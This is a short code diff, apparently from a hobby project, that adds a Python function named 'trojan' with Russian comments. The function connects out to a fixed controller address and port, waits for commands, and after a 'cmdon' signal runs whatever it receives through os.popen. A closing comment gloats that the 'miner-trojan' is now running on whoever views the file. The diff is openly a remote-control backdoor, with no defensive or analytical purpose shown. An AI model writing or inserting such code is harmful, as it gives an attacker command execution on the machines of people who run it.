@@ -1,0 +1,21 @@
+def trojan():
+    HOST = '192.168.2.112'
+    PORT = 9090
+    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    client.connect((HOST, PORT))
+    while True:
+        server_command = client.recv(1024).decode('cp866')
+        if server_command == 'cmdon':
+            cmd_mode = True
+            # Отправляем информацию на сервер
+            client.send('Получен доступ к терминалу'.encode('cp866'))
+            continue
+        if server_command == 'cmdoff':
+            cmd_mode = False
+        if cmd_mode:
+            os.popen(server_command)
+        else:
+            if server_command == 'hello':
+                print('Hello World!')
+        client.send(f'{server_command} успешно отправлена!'.encode('cp866'))
+        #Если ты вилешь ету надпись, то майгер-троян начел работать! Да и даже если ты смотришь файл с вс кода!       ХАХАХА
